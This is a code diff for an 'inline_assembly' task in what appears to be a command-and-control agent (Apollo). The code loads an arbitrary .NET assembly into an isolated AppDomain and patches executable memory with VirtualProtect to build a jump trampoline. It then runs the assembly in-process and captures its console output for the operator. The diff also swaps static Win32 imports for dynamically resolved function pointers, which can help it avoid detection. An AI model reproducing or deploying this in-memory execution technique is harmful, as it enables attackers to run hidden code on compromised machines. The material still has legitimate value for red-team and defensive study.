@@ -18,6 +18,7 @@ using ApolloInterop.Serializers;
 using System.Threading;
 using System.IO;
 using System.Collections.Concurrent;
+using System.ComponentModel;
 using System.IO.Pipes;
 using ApolloInterop.Structs.ApolloStructs;
 using ApolloInterop.Classes.Core;
@@ -26,6 +27,8 @@ using ApolloInterop.Utils;
 using System.Runtime.InteropServices;
 using System.Reflection;
 using System.Runtime.CompilerServices;
+using ApolloInterop.Classes.Api;
+using ApolloInterop.Classes.IO;
 
 namespace Tasks
 {
@@ -34,19 +37,25 @@ namespace Tasks
         [DataContract]
         internal struct InlineAssemblyParameters
         {
-            [DataMember(Name = "pipe_name")]
-            public string PipeName;
             [DataMember(Name = "assembly_name")]
             public string AssemblyName;
             [DataMember(Name = "assembly_arguments")]
             public string AssemblyArguments;
-            [DataMember(Name = "loader_stub_id")]
-            public string LoaderStubId;
         }
+        
+        private delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        private VirtualProtect _pVirtualProtect;
 
-        [DllImport("kernel32")]
-        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        private delegate IntPtr CommandLineToArgvW(
+            [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
+            out int pNumArgs);
 
+        private CommandLineToArgvW _pCommandLineToArgvW;
+        
+        private delegate IntPtr LocalFree(IntPtr hMem);
+
+        private LocalFree _pLocalFree;
+        
         private AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
         private JsonSerializer _serializer = new JsonSerializer();
@@ -58,48 +67,48 @@ namespace Tasks
 
 
         private bool _completed = false;
-        public string[] SplitCommandLine(string commandLine)
-        {
-            bool inQuotes = false;
-
-            string cmdline = commandLine.Trim();
-            List<string> cmds = new List<string>();
-            string curCmd = "";
-            for (int i = 0; i < cmdline.Length; i++)
-            {
-                char c = cmdline[i];
-                if (c == '\"' || c == '\'')
-                    inQuotes = !inQuotes;
-                if (!inQuotes && c == ' ')
-                {
-                    cmds.Add(curCmd);
-                    curCmd = "";
-                }
-                else
-                {
-                    curCmd += c;
-                }
-            }
-            if (!string.IsNullOrEmpty(curCmd))
-                cmds.Add(curCmd);
-            string[] results = cmds.ToArray();
-            for (int i = 0; i < results.Length; i++)
-            {
-                if (results[i].Length > 2)
-                {
-                    if (results[i][0] == '\"' && results[i][results[i].Length - 1] == '\"')
-                        results[i] = results[i].Substring(1, results[i].Length - 2);
-                    else if (results[i][0] == '\'' && results[i][results[i].Length - 1] == '\'')
-                        results[i] = results[i].Substring(1, results[i].Length - 1);
-                }
-            }
-            return results;
-        }
+        
         public inline_assembly(IAgent agent, Task task) : base(agent, task)
         {
+            _pVirtualProtect = agent.GetApi().GetLibraryFunction<VirtualProtect>(Library.KERNEL32, "VirtualProtect");
+            _pCommandLineToArgvW =
+                agent.GetApi().GetLibraryFunction<CommandLineToArgvW>(Library.SHELL32, "CommandLineToArgvW");
+            _pLocalFree = agent.GetApi().GetLibraryFunction<LocalFree>(Library.KERNEL32, "LocalFree");
+        }
+        
+        private string[] ParseCommandLine(string cmdline)
+        {
+            int numberOfArgs;
+            IntPtr ptrToSplitArgs;
+            string[] splitArgs;
+
+            ptrToSplitArgs = _pCommandLineToArgvW(cmdline, out numberOfArgs);
+
+            // CommandLineToArgvW returns NULL upon failure.
+            if (ptrToSplitArgs == IntPtr.Zero)
+                throw new ArgumentException("Unable to split argument.", new Win32Exception());
+
+            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
+            try
+            {
+                splitArgs = new string[numberOfArgs];
+
+                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
+                // Copy each of these strings into our split argument array.
+                for (int i = 0; i < numberOfArgs; i++)
+                    splitArgs[i] = Marshal.PtrToStringUni(
+                        Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));
+
+                return splitArgs;
+            }
+            finally
+            {
+                // Free memory obtained by CommandLineToArgW.
+                _pLocalFree(ptrToSplitArgs);
+            }
         }
 
-        public static string loadAppDomainModule(String[] sParams, Byte[] bMod)
+        public bool loadAppDomainModule(String[] sParams, Byte[] bMod)
         {
             string result = "";
             var bytes = bMod;
@@ -110,7 +119,10 @@ namespace Tasks
             {
                 isolationDomain.Load(bMod);
             }
-            catch { }
+            catch
+            {
+                return false;
+            }
             var Sleeve = new CrossAppDomainDelegate(Console.Beep);
             var Ace = new CrossAppDomainDelegate(ActivateLoader);
 
@@ -129,53 +141,50 @@ namespace Tasks
             patch[2] = 12;
 
             uint oldprotect = 0;
-            VirtualProtect(codeSleeve, new UIntPtr((uint)patch[2]), 0x4, out oldprotect);
+            if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), 0x4, out oldprotect))
+            {
+                return false;
+            }
             Marshal.WriteByte(codeSleeve, 0x48);
             Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
             Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
             Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
             Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
-            VirtualProtect(codeSleeve, new UIntPtr((uint)patch[2]), oldprotect, out oldprotect);
+            if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), oldprotect, out oldprotect))
+            {
+                return false;
+            }
             try
             {
                 isolationDomain.DoCallBack(Sleeve);
             }
             catch (Exception ex)
             {
+                return false;
             }
-            string str = isolationDomain.GetData("str") as string;
-            result = str;
             unloadAppDomain(isolationDomain);
-            return result;
+            return true;
         }
 
         static void ActivateLoader()
         {
             string[] str = AppDomain.CurrentDomain.GetData("str") as string[];
-            string output = "";
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
                 if (!asm.FullName.Contains("mscor"))
                 {
-                    TextWriter realStdOut = Console.Out;
-                    TextWriter realStdErr = Console.Error;
-                    TextWriter stdOutWriter = new StringWriter();
-                    TextWriter stdErrWriter = new StringWriter();
-                    Console.SetOut(stdOutWriter);
-                    Console.SetError(stdErrWriter);
-                    var result = asm.EntryPoint.Invoke(null, new object[] { str });
-
-                    Console.Out.Flush();
-                    Console.Error.Flush();
-                    Console.SetOut(realStdOut);
-                    Console.SetError(realStdErr);
-
-                    output = stdOutWriter.ToString();
-                    output += stdErrWriter.ToString();
+                    var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
+                    if (costuraLoader != null)
+                    {
+                        var costuraLoaderMethod = costuraLoader.GetMethod("Attach", BindingFlags.Public | BindingFlags.Static);
+                        if (costuraLoaderMethod != null)
+                        {
+                            costuraLoaderMethod.Invoke(null, new object[] { });   
+                        }
+                    }
+                    asm.EntryPoint.Invoke(null, new object[] { str });
                 }
             }
-            AppDomain.CurrentDomain.SetData("str", output);
-
         }
 
         public static void unloadAppDomain(AppDomain oDomain)
@@ -195,51 +204,46 @@ namespace Tasks
             return new System.Threading.Tasks.Task(() =>
             {
                 TaskResponse resp;
-                Process proc = null;
+                TextWriter realStdOut = Console.Out;
+                TextWriter realStdErr = Console.Error;
                 try
                 {
                     _agent.AcquireOutputLock();
-                    InlineAssemblyParameters parameters = _jsonSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
-                    if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
-                        string.IsNullOrEmpty(parameters.AssemblyName))
-                    {
-                        resp = CreateTaskResponse(
-                            $"One or more required arguments was not provided.",
-                            true,
-                            "error");
-                    }
-                    else
-                    {
-                        if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
-                        {
-                            if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
-                            {
-                                byte[] ByteData = assemblyBytes;
-                                string[] StringData = SplitCommandLine(parameters.AssemblyArguments);
 
-                                string output = "";
-                                output = loadAppDomainModule(StringData, ByteData);
-                                if (!string.IsNullOrEmpty(output))
-                                {
-                                    _agent.GetTaskManager().AddTaskResponseToQueue(
-                                        CreateTaskResponse(
-                                            output,
-                                            true,
-                                            ""));
-                                }
-                            }
-                            else
+                    InlineAssemblyParameters parameters = _jsonSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
+                    
+                    if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
+                    {
+                        byte[] ByteData = assemblyBytes;
+                        string[] stringData = ParseCommandLine(parameters.AssemblyArguments);
+                        
+                        EventableStringWriter stdoutWriter = new EventableStringWriter();
+                        stdoutWriter.BufferWritten += (sender, args) =>
+                        {
+                            if (!string.IsNullOrEmpty(args.Data))
                             {
-                                resp = CreateTaskResponse(
-                                    $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
-                                    true,
-                                    "error");
+                                _agent.GetTaskManager().AddTaskResponseToQueue(
+                                    CreateTaskResponse(
+                                        args.Data,
+                                        false,
+                                        ""));
                             }
+                        };
+                        Console.SetOut(stdoutWriter);
+                        Console.SetError(stdoutWriter);
+
+                        if (loadAppDomainModule(stringData, ByteData))
+                        {
+                            resp = CreateTaskResponse("", true);
                         }
                         else
                         {
-                            resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
+                            resp = CreateTaskResponse("Failed to load module.", true, "error");
                         }
+                    }
+                    else
+                    {
+                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
                     }
                 }
                 catch (Exception ex)
@@ -248,8 +252,13 @@ namespace Tasks
                 }
                 finally
                 {
+                    Console.Out.Flush();
+                    Console.Error.Flush();
+                    Console.SetOut(realStdOut);
+                    Console.SetError(realStdErr);
                     _agent.ReleaseOutputLock();
                 }
+                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
             }, _cancellationToken.Token);
         }
 
